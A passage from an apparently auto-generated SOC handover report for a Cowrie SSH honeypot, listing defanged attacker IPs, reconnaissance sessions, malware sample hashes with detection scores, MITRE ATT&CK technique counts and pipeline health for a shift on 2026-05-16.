- [ ] Submit `81.28.167[.]30` to AbuseIPDB if not already reported
- [ ] Block `81.28.167[.]30` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `107.182.234[.]69` | **252** | 2026-05-16 17:01 | 2026-05-16 19:09 | 181m | 0 | `T1592` | 🟠 MEDIUM |
| `45.148.120[.]187` | **22** | 2026-05-16 17:02 | 2026-05-16 19:00 | 24m | 0 | `T1592` | 🟠 MEDIUM |
| `175.107.31[.]20` | **20** | 2026-05-16 17:31 | 2026-05-16 19:08 | 13m | 0 | `T1592` | 🟠 MEDIUM |
| `101.36.122[.]139` | **17** | 2026-05-16 17:01 | 2026-05-16 17:23 | 0m | 17 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `187.184.120[.]154` | **10** | 2026-05-16 17:03 | 2026-05-16 17:12 | 20m | 0 | `T1592` | 🟠 MEDIUM |
| `14.29.176[.]8` | **7** | 2026-05-16 17:01 | 2026-05-16 17:08 | 12m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `149.255.39[.]70` | **4** | 2026-05-16 17:02 | 2026-05-16 18:29 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.96.197[.]182` | **2** | 2026-05-16 17:41 | 2026-05-16 17:44 | 4m | 0 | `T1592` | 🟢 LOW |
| `120.196.66[.]80` | **2** | 2026-05-16 17:37 | 2026-05-16 17:39 | 4m | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]42` | **2** | 2026-05-16 17:04 | 2026-05-16 17:08 | 4m | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]213` | 1 | 2026-05-16 17:57 | 2026-05-16 17:57 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.63.108[.]25` | 1 | 2026-05-16 17:41 | 2026-05-16 17:41 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.168.169[.]128` | 1 | 2026-05-16 17:39 | 2026-05-16 17:39 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.13.114[.]161` | 1 | 2026-05-16 17:57 | 2026-05-16 17:59 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.178[.]166` | 1 | 2026-05-16 17:42 | 2026-05-16 17:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `106.13.48[.]156` | 1 | 2026-05-16 17:42 | 2026-05-16 17:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.219.104[.]42` | 1 | 2026-05-16 17:55 | 2026-05-16 17:55 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `121.168.139[.]251` | 1 | 2026-05-16 17:53 | 2026-05-16 17:53 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.105[.]36` | 1 | 2026-05-16 18:07 | 2026-05-16 18:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `172.191.239[.]155` | 1 | 2026-05-16 17:38 | 2026-05-16 17:38 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `201.77.124[.]248` | 1 | 2026-05-16 18:07 | 2026-05-16 18:07 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `43.173.69[.]147` | 1 | 2026-05-16 18:07 | 2026-05-16 18:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `81.28.167[.]30` | 1 | 2026-05-16 18:09 | 2026-05-16 18:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `91.196.152[.]17` | 1 | 2026-05-16 18:26 | 2026-05-16 18:26 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.196.152[.]20` | 1 | 2026-05-16 18:26 | 2026-05-16 18:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.231.89[.]181` | 1 | 2026-05-16 18:29 | 2026-05-16 18:29 | 2s | 0 | `T1592` | 🟢 LOW |
| `92.175.80[.]209` | 1 | 2026-05-16 18:05 | 2026-05-16 18:05 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `94.231.206[.]248` | 1 | 2026-05-16 18:35 | 2026-05-16 18:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]249` | 1 | 2026-05-16 18:35 | 2026-05-16 18:35 | 3s | 0 | `T1592` | 🟢 LOW |
| `94.231.206[.]255` | 1 | 2026-05-16 18:38 | 2026-05-16 18:38 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `187.184.120[.]154` | MX | Cablemas Telecomunicaciones SA de CV | **100** ⚠️ | 1 |
| `14.29.176[.]8` | CN | CHINANET Guangdong province network | **100** ⚠️ | 0 |
| `91.196.152[.]17` | FR | FR ONYPHE | **100** ⚠️ | 50 |
| `149.255.39[.]70` | US | Hivelocity LLC | **100** ⚠️ | 2 |
| `14.103.105[.]36` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `121.168.139[.]251` | KR | Korea Telecom | **100** ⚠️ | 50 |
| `81.28.167[.]30` | RU | PJSC Rostelecom | **100** ⚠️ | 50 |
| `94.231.206[.]255` | SG | FR ONYPHE | **100** ⚠️ | 47 |
| `175.107.31[.]20` | PK | National Telecommunication Corporation | **100** ⚠️ | 2 |
| `43.173.69[.]147` | US | ACEVILLE PTE.LTD. | **100** ⚠️ | 27 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 102 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 55 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 29 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 29 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 28 |

---

## 🔕 False Positive Summary (11 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 424 cases |
| Tool 34  | Credential Extractor        | ✅ 83 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 41 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 11 filtered (2.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 32 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 55 priority case(s) shown individually · 30 recon entry/entries in table (10 group(s) consolidating 338 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-16T19:11:03Z_
